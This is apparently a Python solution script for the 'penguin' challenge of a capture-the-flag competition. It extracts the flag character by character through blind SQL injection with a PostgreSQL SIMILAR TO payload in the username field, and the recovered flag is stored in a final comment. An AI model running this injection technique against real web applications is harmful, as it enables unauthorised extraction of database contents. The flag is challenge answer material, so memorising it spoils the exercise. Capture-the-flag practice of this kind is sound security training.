import requests
import string

# Base URL of the target
url = "https://penguin.chall.lac.tf/submit"

# Initialize the flag with the known length but unknown content
flag = "_" * 45

# Allowed characters set based on the problem description
allowed_chars = string.ascii_letters + string.digits + " flag{aword}_"
print(allowed_chars)
# Function to attempt to update the flag character by character
def guess_flag_character_by_character():
    global flag
    for position in range(len(flag)):
        for char in allowed_chars:
            # Construct the current guess by replacing the underscore at the current position with the trial character
            current_guess = flag[:position] + char + flag[position + 1:]
            username = f"a' OR name SIMILAR TO \'{current_guess}"
            data = {'username': username}
            response = requests.post(url, data=data)
            print(f'tried {username} got {response.text}')
            if "We found a penguin!!!!!" in response.text:
                # Update the flag with the correct character at the current position
                flag = current_guess
                print(f"Found character at position {position}: {char} (Current flag: {flag})")
                # Break out of the inner loop once the correct character is found
                break

# Start the guessing process
guess_flag_character_by_character()

# Final output
print(f"Final flag: {flag}")
#lactf{90stgr35_3s_n0t_l7k3_th3_0th3r_dbs_0w0}